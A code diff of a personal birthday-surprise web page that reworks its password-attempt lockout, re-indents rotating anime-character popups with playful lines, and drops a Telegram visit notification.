-          btn.disabled   = true;
-          showMsg('locked', '🔒 Too many attempts. Come back tomorrow!');
+        } else {
+          attempts++;
+          saveAttempts(attempts);
+          logAttempt(typed, false);
+
+          const msg = teaseMsgs[Math.floor(Math.random() * teaseMsgs.length)];
+          showMsg('wrong', msg);
+          updateAttemptsUI(attempts);
+          input.value = '';
+
+          if (attempts >= MAX_ATTEMPTS) {
+            input.disabled = true;
+            btn.disabled = true;
+            showMsg('locked', '🔒 Too many attempts. Come back tomorrow!');
+          }
         }
       }
     }
-  }
 
-  /* ═══════════════════════════════════════════
-     ANIME CHARACTERS
-  ═══════════════════════════════════════════ */
-  const CHARACTERS = [
-    {
-      name: 'Luffy',
-      img: 'luffy.png',
-      lines: [
-        "I'm gonna be the Pirate King! But first, who's this surprise for? 🏴‍☠️",
-        "Shishishi! Someone's getting a birthday surprise!",
-        "Meat!! And birthday cake!! Best combo ever! 🍖🎂",
-        "I don't know what a countdown is but it sounds exciting!!",
-      ]
-    },
-    {
-      name: 'Naruto',
-      img: 'naruto.png',
-      lines: [
-        "Believe it! This surprise is going to be AMAZING! 🍜",
-        "Dattebayo! I trained hard to keep this secret!",
-        "Even the Hokage doesn't know what's inside… yet! 👀",
-        "Shadow clone jutsu! But the real gift is patience~ 🌀",
-      ]
-    },
-    {
-      name: 'Gojo',
-      img: 'gojo.png',
-      lines: [
-        "Throughout heaven and earth… this surprise is unmatched 😎",
-        "The one and only Gojo is here to say happy birthday 💙",
-        "Infinity can't stop this moment from coming 🌀",
-        "You thought I'd spoil it? I'm the strongest, not the loudest 😏",
-      ]
-    },
-    {
-      name: 'Zoro',
-      img: 'zoro.png',
-      lines: [
-        "I got lost… but I found this birthday page instead 🗺️",
-        "Nothing will cut through this surprise. Trust the process ⚔️",
-        "I have three swords. You have one countdown. Fair trade.",
-        "If this surprise fails, I'll cut myself… just kidding 😅",
-      ]
-    },
-    {
-      name: 'Senku',
-      img: 'senku.png',
-      lines: [
-        "10 billion percent sure this will be the best birthday ever 🧪",
-        "Science says: the wait makes the surprise 10x better!",
-        "I calculated exactly when to show up. I'm always right 📊",
-        "Kingdom of Science approves this birthday 💡",
-      ]
-    },
-    {
-      name: 'Levi',
-      img: 'levi.png',
-      lines: [
-        "Tch. Stop wasting time. The surprise is worth waiting for ⚔️",
-        "I've seen titans. This countdown is nothing. Hold on.",
-        "Don't get emotional. Actually… it's okay if you do 🫡",
-        "Humanity's strongest soldier… delivering birthday vibes 💫",
-      ]
-    },
-  ];
-
-  const CORNERS  = ['tl', 'tr', 'bl', 'br'];
-  let charQueue  = [];
-  let activeCorners = {};
-
-  function shuffleChars() {
-    charQueue = [...CHARACTERS].sort(() => Math.random() - 0.5);
-  }
-
-  function nextChar() {
-    if (charQueue.length === 0) shuffleChars();
-    return charQueue.pop();
-  }
-
-  function showCharInCorner(corner) {
-    if (activeCorners[corner]) return;
-
-    const char     = nextChar();
-    const line     = char.lines[Math.floor(Math.random() * char.lines.length)];
-    const el       = document.getElementById(`char-${corner}`);
-    const img      = document.getElementById(`img-${corner}`);
-    const nameEl   = document.getElementById(`name-${corner}`);
-    const txtEl    = document.getElementById(`txt-${corner}`);
-
-    img.src        = char.img;
-    img.alt        = char.name;
-    nameEl.textContent = char.name;
-    txtEl.textContent  = line;
-
-    activeCorners[corner] = true;
-    el.classList.add('show');
-
-    setTimeout(() => {
-      el.classList.remove('show');
-      setTimeout(() => { activeCorners[corner] = false; }, 450);
-    }, 2600);
-  }
-
-  function scheduleCharacters() {
-    shuffleChars();
-
-    function spawnRandom() {
-      const available = CORNERS.filter(c => !activeCorners[c]);
-      if (available.length > 0) {
-        const corner = available[Math.floor(Math.random() * available.length)];
-        showCharInCorner(corner);
-      }
-      const next = Math.random() * 2500 + 2000;
-      setTimeout(spawnRandom, next);
+    function shuffleChars() {
+      charQueue = [...CHARACTERS].sort(() => Math.random() - 0.5);
     }
 
-    setTimeout(spawnRandom, 1500);
-  }
+    function nextChar() {
+      if (charQueue.length === 0) shuffleChars();
+      return charQueue.pop();
+    }
 
-  /* ═══════════════════════════════════════════
-     INIT
-  ═══════════════════════════════════════════ */
-  document.addEventListener('DOMContentLoaded', () => {
-    // Notify visit
-    sendTelegram(`👀 <b>Someone visited the Birthday Page!</b>`);
+    function showCharInCorner(corner) {
+      if (activeCorners[corner]) return;
 
-    createStars();
-    createParticles();
-    updateCountdown();
-    setInterval(updateCountdown, 1000);
-    initPassword();
-    scheduleCharacters();
-  });
-</script>
+      const char = nextChar();
+      const line = char.lines[Math.floor(Math.random() * char.lines.length)];
+      const el = document.getElementById(`char-${corner}`);
+      const img = document.getElementById(`img-${corner}`);
+      const nameEl = document.getElementById(`name-${corner}`);
+      const txtEl = document.getElementById(`txt-${corner}`);
+
+      img.src = char.img;
+      img.alt = char.name;
+      nameEl.textContent = char.name;
+      txtEl.textContent = line;
+
+      activeCorners[corner] = true;
+      el.classList.add('show');
+
+      setTimeout(() => {
+        el.classList.remove('show');
+        setTimeout(() => {
+          activeCorners[corner] = false;
+        }, 450);
+      }, 2600);
+    }
+
+    function scheduleCharacters() {
+      shuffleChars();
+
+      function spawnRandom() {
+        const available = CORNERS.filter(c => !activeCorners[c]);
+        if (available.length > 0) {
+          const corner = available[Math.floor(Math.random() * available.length)];
+          showCharInCorner(corner);
+        }
+        const next = Math.random() * 2500 + 2000;
+        setTimeout(spawnRandom, next);
+      }
+
+      setTimeout(spawnRandom, 1500);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      createStars();
+      createParticles();
+      updateCountdown();
+      setInterval(updateCountdown, 1000);
+      initPassword();
+      scheduleCharacters();
+    });
+  </script>
 </body>
 </html>
